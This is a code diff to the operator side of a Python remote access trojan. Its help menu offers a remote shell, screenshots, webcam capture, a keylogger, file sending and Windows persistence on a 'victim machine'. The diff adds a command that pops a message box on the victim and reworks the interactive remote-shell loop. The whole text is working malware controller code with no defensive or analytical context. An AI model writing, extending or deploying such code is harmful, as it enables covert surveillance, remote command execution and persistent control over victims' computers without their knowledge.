@@ -54,10 +54,11 @@ class RAT:
         print('screenshot    ::  take screenshot from victim machine')
         print('webcam        ::  take picture from victims webcam')
         print('send_file     ::  send file to victim machine')
-        print('persistence   ::  run persistence script (windows only)')
+        print('persistence   ::  run persistence script (windows victim only)')
         print('keylogger     ::  run keylogger on victim machine')
+        print('msg           ::  open MessageBox on victim machine (windows victim only)')
         print('help          ::  show this message')
-        print('clear         ::  clear console')    
+        print('clear         ::  clear console')  
         print()
 
     def main(self):
@@ -68,15 +69,18 @@ class RAT:
             conn = self.conn
             cmd = input('pirate@%s> '%self.addr[0])
             if cmd == 'shell':
+                conn.send(cmd.encode())
+                print(conn.recv(1024).decode(),end="")
                 while EXIT != True:
-                    cmd = input('shell@%s# '%self.addr[0])
+                    cmd = input('> ')
                     if cmd == 'exit':
                         EXIT = True
+                        print()
                     elif cmd == '' or cmd == ' ':
                         pass
                     else:
                         conn.send(('shell:'+cmd).encode())
-                        print(conn.recv(40960).decode('Latin-1'))
+                        print(conn.recv(40960).decode('Latin-1'),end="")
             elif cmd == 'clear':
                 self.clear()
             elif cmd == 'help':
@@ -148,6 +152,14 @@ class RAT:
                 conn.send(cmd.encode())
                 sysinfo = conn.recv(4096).decode('Latin_1')
                 print(sysinfo)
+
+            elif cmd == 'msg':
+                print('Usage: msg <your_message>')
+            
+            elif cmd.startswith('msg '):
+                msg = cmd[4:]
+                conn.send(str('msg:'+msg).encode())
+                print('Sended!')
             elif cmd == '':
                 pass
 
